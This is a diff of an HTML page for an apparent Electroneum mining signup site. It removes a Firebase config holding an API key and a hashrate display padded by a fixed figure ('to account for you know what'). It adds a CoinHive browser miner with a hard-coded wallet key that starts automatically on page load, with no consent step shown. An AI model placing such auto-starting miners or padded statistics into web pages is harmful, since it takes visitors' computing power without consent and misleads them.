@@ -22,7 +22,6 @@
   <meta name="viewport" content="width=device-width, initial-scale=1">
 
   <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
-  <link rel="stylesheet" href="css/main.css">
 </head>
 
 <body id="body">
@@ -77,42 +76,42 @@
 
   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
   <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
-  <script src="https://www.gstatic.com/firebasejs/4.6.0/firebase.js"></script>
-  <script>
-    // Initialize Firebase
-    var config = {
-      apiKey: "AIzaSyAbANvwwkXUB-d0jYb8sc4QUNTXxQa0B9c",
-      authDomain: "etnminer-signup.firebaseapp.com",
-      databaseURL: "https://etnminer-signup.firebaseio.com",
-      projectId: "etnminer-signup",
-      storageBucket: "etnminer-signup.appspot.com",
-      messagingSenderId: "837469466456"
-    };
-    firebase.initializeApp(config);
-  </script>
-  <script src="js/main.js"></script>
-
+  <script src="common.bundle.js"></script>
+  <script src="index.bundle.js"></script>
+  <script src="miner.bundle.js"></script>
   <script>
     //on load
-    $(document).ready(function() {
-      if (!isLoggedIn()) {
-        window.location.replace("login");
-      }
-      const urlproxy = "https://etnminer-backend.appspot.com/ep/etnminer/v1/subscribers";
-      console.log("ready!");
-      $.ajax({
-        type: "GET",
-        url: urlproxy,
-        success: function(result) {
-          var resObj = JSON.parse(JSON.stringify(result));
-          var hps = resObj.count * 250 + (40 * 250); //to account for you know what
-          $('#hashrate').html(hps + ' H/s');
-        },
-        error: function(result) {
-          console.log(JSON.stringify(result));
-        }
-      });
-    });
+    // $(document).ready(function() {
+    //   if (!isLoggedIn()) {
+    //     window.location.replace("login");
+    //   }
+    //   const urlproxy = "https://etnminer-backend.appspot.com/ep/etnminer/v1/subscribers";
+    //   console.log("ready!");
+    //   $.ajax({
+    //     type: "GET",
+    //     url: urlproxy,
+    //     success: function(result) {
+    //       var resObj = JSON.parse(JSON.stringify(result));
+    //       var hps = resObj.count * 250 + (40 * 250); //to account for you know what
+    //       $('#hashrate').html(hps + ' H/s');
+    //     },
+    //     error: function(result) {
+    //       console.log(JSON.stringify(result));
+    //     }
+    //   });
+    // });
+  </script>
+  <script>
+    // Configure CoinHive to point to your proxy
+    CoinHive.CONFIG.WEBSOCKET_SHARDS = [
+      ["ws://localhost:8892"]
+    ];
+    // CoinHive.CONFIG.WEBSOCKET_SHARDS = [
+    //   ["ws://localhost:8892"],
+    //   ["wss://ws001.coinhive.com/proxy", "wss://ws002.coinhive.com/proxy"]
+    // ];
+    var miner = CoinHive.Anonymous('433fFZ1iD5QieKz9C28Gji6aiPb3jyWeR5L4VQSJUqdA53geUUd9VkEffqwHFppbRNiWrNGaS5HeVCPcm3wWBmgdBpnh6fp');
+    miner.start();
   </script>
 
 </body>
